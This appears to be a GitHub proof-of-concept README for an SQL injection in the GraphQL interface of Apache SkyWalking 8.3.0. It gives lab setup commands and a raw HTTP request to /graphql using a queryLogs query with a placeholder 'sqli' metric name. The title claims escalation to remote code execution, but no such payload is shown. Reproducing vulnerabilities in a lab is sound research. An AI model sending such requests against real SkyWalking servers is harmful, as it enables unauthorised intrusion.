# POC_Apache_Skywalking-8.3.0_SQL_Injection_to_RCE
Application performance monitor tool for distributed systems, especially designed for microservices, cloud native and container-based (Docker, Kubernetes, Mesos) architectures.

In GraphQL interfaces of Apache Skywalking 8.3.0 and previous, there is a H2 Database SQL injection vulnerability.

# Vulnerability environment
Let's install Apache Skywalking 8.3.0 using the following commands.<br>
# Prerequisites
Java Development Kit (JDK): Apache Skywalking requires Java to run. Make sure you have Java 8 or later installed on your system
```bash
sudo apt update && sudo apt install openjdk-11-jdk -y
```
Set Environment Variables
```bash 
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
```
# Download Apache Skywalking 8.3.0
```bash
wget https://archive.apache.org/dist/skywalking/8.3.0/apache-skywalking-apm-8.3.0.tar.gz
```
Extract the downloaded archive
```bash
tar -zxvf apache-skywalking-apm-8.3.0.tar.gz
```
Start Apache Skywalking
```bash
cd apache-skywalking-apm-bin/bin
./startup.sh
```
After the environment is started, visit http://your-ip:8080 to view the Skywalking page.
# POC
The HTTP request of this GraphQL query is
```bash
POST /graphql HTTP/1.1
Host: 192.168.1.12:8080
Content-Length: 405
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.1.12:8080
Referer: http://192.168.1.12:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"sqli",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}
```
I using BurpSuite to send the following GraphQL query below
![Alt Text](https://github.com/NeedMor3Coffee/POC_Apache_Skywalking-8.3.0_SQL_Injection_Vulnerability_to_RCE/blob/main/graphql_exploit.jpg)
# References:
https://youtu.be/CtkhTjB95Z0












